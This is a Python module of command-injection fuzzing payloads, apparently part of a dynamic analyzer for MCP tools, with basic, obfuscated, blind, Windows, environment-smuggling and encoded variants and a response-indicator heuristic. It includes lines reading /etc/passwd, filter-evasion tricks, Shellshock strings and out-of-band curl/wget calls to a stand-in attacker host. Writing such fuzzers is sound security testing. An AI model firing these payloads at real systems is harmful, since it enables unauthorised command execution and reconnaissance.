"""Command-injection fuzzing payloads for R5 (input validation) and R2
(unauthorised code execution).

Categories:

* ``BASIC``        — single-operator chains using ``id``/``whoami``
* ``OBFUSCATED``   — IFS, brace expansion, backslash, quote-splitting
* ``BLIND``        — out-of-band & time-based payloads (no echo required)
* ``WINDOWS``      — cmd.exe and PowerShell variants
* ``ENV_SMUGGLE``  — payloads that hide in environment-variable expansion
* ``ENCODED``      — base64 / hex / unicode-encoded shell payloads
"""

from __future__ import annotations

CANARY = "CMDINJECTION_CANARY"
SLEEP_CANARY_SEC = 5  # blind payloads sleep this long; orchestrator measures latency

# ---------------------------------------------------------------------------
# Basic operator chains
# ---------------------------------------------------------------------------

BASIC: list[str] = [
    # Sequential / conditional / pipe / background
    "; id",
    "| id",
    "& id",
    "&& id",
    "|| id",
    "; whoami",
    "| whoami",
    "&& whoami",
    "; uname -a",
    "; hostname",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "&& cat /etc/passwd",

    # Command substitution
    "`id`",
    "$(id)",
    "$(whoami)",
    "`cat /etc/passwd`",
    "$(cat /etc/passwd)",
    "$(uname -a)",
    "$( whoami )",        # extra spaces — defeats naive `\$\(.+\)` regex

    # Canary echoes
    f"; echo {CANARY}",
    f"| echo {CANARY}",
    f"$(echo {CANARY})",
    f"`echo {CANARY}`",
    f"&& echo {CANARY}",
    f"|| echo {CANARY}",

    # Newline injection (works against shell=True with single-line input)
    "\nid\n",
    "\nwhoami\n",
    f"\necho {CANARY}\n",
    "\rid\r",

    # Quote-break + chain
    "'; id; echo '",
    "\"; id; echo \"",
    "a]]; id; echo [[",
    "a'); id; echo ('",
]

# ---------------------------------------------------------------------------
# Obfuscation — IFS, brace, backslash, quote-splitting
# ---------------------------------------------------------------------------

OBFUSCATED: list[str] = [
    # Internal Field Separator — replaces space with $IFS so allow-lists miss it
    ";${IFS}id",
    ";${IFS}cat${IFS}/etc/passwd",
    ";cat${IFS}/etc/passwd",
    ";cat$IFS$9/etc/passwd",
    ";{cat,/etc/passwd}",            # brace expansion
    ";{ls,-la,/}",

    # Backslash quote-breaking
    ";c\\at /etc/passwd",
    ";\\cat /etc/passwd",
    ";c''at /etc/passwd",
    ';c""at /etc/passwd',
    ";cat /et\\c/passwd",

    # `which`-style indirection
    ";$(which id)",
    "; $(echo aWQ= | base64 -d)",    # 'id' in base64
    "; $(printf '\\x69\\x64')",      # 'id' from hex

    # Bash arithmetic context as a payload sink
    ";$((1+1))",
    "$((`id`))",

    # GTFOBins-style legitimate-binary abuse
    ";find . -exec id \\;",
    ";awk 'BEGIN{system(\"id\")}'",
    ";xargs -I{} id <<< {}",
    ";env -i id",
    ";vi -c '!id' -c 'q!' /tmp/x",

    # Glob expansion that resolves to /bin/cat /etc/passwd
    ";/bin/c?t /etc/p?sswd",
    ";/???/c?t /???/p?sswd",
]

# ---------------------------------------------------------------------------
# Blind — no echo expected; detected by network OOB or response latency
# ---------------------------------------------------------------------------

BLIND: list[str] = [
    # Time-based — orchestrator can flag latency above SLEEP_CANARY_SEC
    f"; sleep {SLEEP_CANARY_SEC}",
    f"| sleep {SLEEP_CANARY_SEC}",
    f"&& sleep {SLEEP_CANARY_SEC}",
    f"`sleep {SLEEP_CANARY_SEC}`",
    f"$(sleep {SLEEP_CANARY_SEC})",
    f"; ping -c {SLEEP_CANARY_SEC} 127.0.0.1",
    f"; perl -e 'sleep({SLEEP_CANARY_SEC})'",
    f"; python3 -c 'import time; time.sleep({SLEEP_CANARY_SEC})'",

    # Out-of-band DNS — observable by netmon if the sandbox resolves
    "; nslookup oob.attacker.example",
    "; dig +short oob.attacker.example",
    "; host oob.attacker.example",
    "; curl -s http://oob.attacker.example/" + CANARY,
    "; wget -qO- http://oob.attacker.example/" + CANARY,
    "; ping -c 1 oob.attacker.example",

    # File-write side-effect (honeypot picks it up)
    "; touch /tmp/" + CANARY,
    "; echo " + CANARY + " > /tmp/" + CANARY + ".txt",
]

# ---------------------------------------------------------------------------
# Windows
# ---------------------------------------------------------------------------

WINDOWS: list[str] = [
    "& whoami",
    "&& whoami",
    "| whoami",
    "& dir C:\\",
    "& type C:\\Windows\\win.ini",
    "&& type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "& net user",
    "& systeminfo",
    "& ipconfig /all",
    f"& echo {CANARY}",

    # PowerShell variants
    "; powershell -c whoami",
    "; powershell -enc dwBoAG8AYQBtAGkA",  # encoded 'whoami'
    "; iex(whoami)",
    "; powershell -nop -c \"Get-Process\"",
    f"; powershell -c \"echo {CANARY}\"",

    # cmd.exe quoting tricks
    '" & whoami & "',
    "\" & ping -n 5 127.0.0.1 & \"",
]

# ---------------------------------------------------------------------------
# Env-variable smuggling
# ---------------------------------------------------------------------------

ENV_SMUGGLE: list[str] = [
    # PROMPT_COMMAND / BASH_ENV — runs when a child shell starts
    "PROMPT_COMMAND=id; bash -c true",
    f"BASH_ENV=<(echo {CANARY}) bash",
    f"ENV=<(echo {CANARY}) sh",

    # GIT_SSH_COMMAND — runs whenever git invokes ssh
    f"GIT_SSH_COMMAND='id; echo {CANARY}' git ls-remote ssh://x",

    # LD_PRELOAD with a malicious shared object pointer
    "LD_PRELOAD=/tmp/evil.so id",

    # Shell-function smuggling via env (Shellshock-class)
    "() { :;}; id",
    "() { _;} >_[$($())] { id; }",
]

# ---------------------------------------------------------------------------
# Encoded / hex / unicode
# ---------------------------------------------------------------------------

ENCODED: list[str] = [
    # Base64 of `id`
    "; echo aWQ= | base64 -d | sh",
    "; bash -c \"$(echo aWQ= | base64 -d)\"",

    # Hex
    "; echo -e \"\\x69\\x64\" | sh",
    "; printf '\\x69\\x64' | sh",

    # Reverse string trick
    "; echo 'di' | rev | sh",

    # Unicode look-alike for ';' / '|' (some normalisers treat them equivalently)
    "\uff1b id",       # FULLWIDTH SEMICOLON
    "\uff5c id",       # FULLWIDTH VERTICAL LINE

    # Tab / vertical-tab as separator on lax shells
    "\tid",
    "\vid",
]

PAYLOADS: list[str] = BASIC + OBFUSCATED + BLIND + WINDOWS + ENV_SMUGGLE + ENCODED

# ---------------------------------------------------------------------------
# Response-side indicators
# ---------------------------------------------------------------------------

INDICATORS: list[str] = [
    CANARY,
    "uid=",
    "gid=",
    "root:x:0",
    # `whoami`
    "root\n",
    # `uname -a`
    "Linux ",
    "Darwin ",
    "GNU/Linux",
    # `hostname`
    "localhost.localdomain",
    # `ipconfig`
    "Windows IP Configuration",
    # `systeminfo`
    "OS Name:",
    "OS Version:",
    # `dir C:\`
    "Directory of C:\\",
    "Volume in drive",
    # `net user`
    "User accounts for",
]


def looks_like_injection_success(response_text: str) -> bool:
    """Heuristic: does the response contain output from an injected command?

    Indicators like ``uname -a`` or ``root:x:0:0:`` literally appear in the
    payloads themselves, so a Pydantic validation error that echoes the
    rejected input would falsely trigger this check. Strip the echo region
    first so only server-generated text is inspected.
    """
    from mcp_dynamic_analyzer.payloads._response_filters import strip_input_echoes
    cleaned = strip_input_echoes(response_text)
    return any(ind in cleaned for ind in INDICATORS)
